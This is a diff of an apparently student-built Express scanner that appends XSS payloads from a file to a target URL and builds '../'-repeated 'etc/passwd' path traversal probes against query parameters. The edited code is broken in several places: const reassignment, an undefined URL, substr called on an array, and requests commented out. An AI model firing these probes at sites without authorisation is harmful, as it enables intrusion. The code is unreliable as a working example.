@@ -1,15 +1,18 @@
 const fs = require('fs');
+const axios = require('axios');
+const cheerio = require('cheerio');
 const readline = require('readline');
 const open = require('open');
 const puppeteer = require('puppeteer');
 const http = require('http');
 const { response } = require('express');
 const scan = require("../models/scan");
+const site_depth = require("../site_depth");
 const express = require("express");
 const router = express.Router();
 
-const array = fs.readFileSync('payload.txt').toString().split("\n");
 
+const payload = fs.readFileSync('payload.txt').toString().split("\n");
 
 
 let xss_scan_success_data = false
@@ -23,11 +26,11 @@ const xss_scan_success = async(req, res) => {
 
 //input 태그 찾는 로직 추가해야됨, front: 데이터 넘어가면 result 페이지로 redirect 시켜야됨
 const xss_scan = async(req, res) => {
-    const url = req.body.href;
+    // const url = req.body.href;
 
-    for (let i in array) {
+    for (let i in payload) {
 
-        payload = array[i]
+        payload = payload[i]
 
         try {
           let victim_url = url + payload;
@@ -59,46 +62,71 @@ const xss_scan = async(req, res) => {
 
 //path traversal 취약점 스캔로직
 const pathtraversal_scan = async(req, res) => {
-  const url =req.body.href;
+  const url = req.body.href;
   const payload = "../";
   let success_url = [];
+  const outputFileName = 'site_tree.txt';
 
-  console.log("-------------------------------------------------------------------------------");
-
-    for (let i = 0; i < 10; i++) {
+    // for (let i =0; i < 10; i++) {
         try {
-            scan_payload = payload.repeat(i + 1) + "etc/passwd"
-            let victim_url = url + scan_payload;
+          // site_depth.crawl(url, 1)
+          // .then(() => {
+          //   site_depth.saveVisitedUrls(outputFileName);
+          // })
+          // .catch((error) => {
+          //   console.error('Error:', error);
+          // });
 
-            const response = await new Promise(resolve => {
-                http.request(victim_url, resolve).end();
-            });
-            const status = response.statusCode;
+          const site_tree = fs.readFileSync('site_tree.txt').toString().split("\n");
 
-            if (status === 200) {
-              
-                scan.create({
-                  scanType: "Path traversal",
-                  scanURL: url,
-                  scanPayload: scan_payload
-                });
+          console.log('1');
 
-                console.log(victim_url);
-                console.log("-------------------------------------------------------------------------------");
-                break;
+          for(let i in site_tree){
+            const match1 = site_tree[i].indexOf('?');
+            const match2 = site_tree[i].indexOf('=');
+
+            if(match1 !== -1 && match2 !== -1){
+              scan_payload = payload.repeat(10) + "etc/passwd"
+              console.log(scan_payload);
+              console.log('2')
+              let victim_url = site_tree.substr(0, match2 + 1) + scan_payload;
+
+              console.log(victim_url);
+
+              // const response = await new Promise(resolve => {
+              //     http.request(victim_url, resolve).end();
+              // });
+              // const status = response.statusCode;
+
+              // if (status === 200) {
+                
+              //     scan.create({
+              //       scanType: "Path traversal",
+              //       scanURL: url,
+              //       scanPayload: scan_payload
+              //     });
+
+              //     console.log(victim_url);
+              //     console.log("-------------------------------------------------------------------------------");
+              //     break;
+              // }
+              // console.log(victim_url);
+              // console.log("-------------------------------------------------------------------------------");
+            }else{
+              console.log('query가 발견되지 않았습니다.');
             }
-            console.log(victim_url);
-            console.log("-------------------------------------------------------------------------------");
+          }
+
         }   
         catch(error) {
-            continue;
+        //     continue;
         }
         // finally {
         //   const scanResult = await scan.findAll({ where: { scanType: "Path traversal" } });
         //   return res.send(JSON.stringify(scanResult));
 
         // }
-        }
+        // }
 }
 
 module.exports = {
